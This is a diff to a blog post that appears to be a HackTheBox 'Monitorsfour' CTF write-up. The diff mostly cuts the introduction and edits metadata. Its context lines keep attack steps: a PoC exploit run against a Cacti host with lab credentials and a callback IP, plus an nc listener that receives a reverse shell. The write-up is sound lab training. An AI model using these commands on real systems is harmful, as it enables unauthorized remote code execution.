@@ -1,6 +1,7 @@
 ---
 author: "amir_rabiee"
 pubDatetime: 2025-12-10T15:46:45.51
+modDatetime: 2025-12-11T12:46:45.51
 title: "HTB - Monitorsfour Machine Writeup"
 featured: false
 draft: false
@@ -15,28 +16,6 @@ description: "Not so 'Easy'"
 
 ## Table of Contents
 
-## Introduction
-
-In this article, I document my first proper CTF experience on the HackTheBox platform. This machine was part of the weekly Seasonal event, though I didn't get a chance to participate in the competition on time - it was the second-to-last one. Despite being labeled "Easy"... it wasn't that simple. HTB machines are generally a level above other platforms, and Seasonal machines are even harder than usual. Also, since this was a live machine, there were naturally no writeups or solutions available on the internet or YouTube for guidance - making this at least medium difficulty for me.
-
-This seemingly simple machine taught many important concepts: fuzzing and enumeration, finding relevant CVEs, password cracking, getting RCE, and overall chaining different attacks to achieve privilege escalation.
-
-Fun fact: both CVEs used in this CTF were from 2025 :))
-
-### Connecting to HackTheBox Machines
-
-For those who haven't participated in HackTheBox yet or just started... there are two ways to connect to machines. You can either use a graphical connection to an Attack Machine (which is essentially a pre-configured ParrotOS) or direct connection to the target machine's network via OpenVPN.
-
-It's more reasonable to connect via OpenVPN and interact with the target IP comfortably in our own environment. Additionally, the platform's Attack Machine has time limitations on the free plan, requiring a subscription for unlimited access.
-
-So what's the problem? The problem is that Iran's filtering system drops OpenVPN connections. I don't have a specific solution worth writing a separate post about, so I'll summarize it here briefly.
-
-Try different ISPs - some have fewer restrictions. Also test all servers and use UDP protocol.
-
-For me, it worked on Samantel ISP + Singapore servers.
-
-The connection process itself is explained on the platform and is straightforward.
-
 ## Reconnaissance
 
 ### nmap
@@ -45,7 +24,7 @@ First step as always... see what services are running on this IP...
 nmap 10.10.11.98
 ```
 
-An nmap scan revealed WinRM and nginx running. The presence of WinRM hints that the host is likely using Windows Linux Subsystem for another service.
+An nmap scan revealed WinRM and nginx running. The presence of WinRM hints that the host is likely using Windows Linux Subsystem for services.
 
 A wget request shows it redirects to monitorsfour.htb, and since this domain naturally won't resolve via DNS, we need to add it to the system's hosts file:
 ```bash
@@ -124,7 +103,7 @@ A simple search found a PoC that gives us RCE. Here's the repo with more details
 python3 poc.py -u marcus -p wonderful1 -i 10.10.14.147 -l 1234 -url http://cacti.monitorsfour.htb
 ```
 
-Before running this, we need an nc listener on port 1234:
+Before running this, we need an nc listener:
 ```bash
 nc -lvnp 1234
 ```
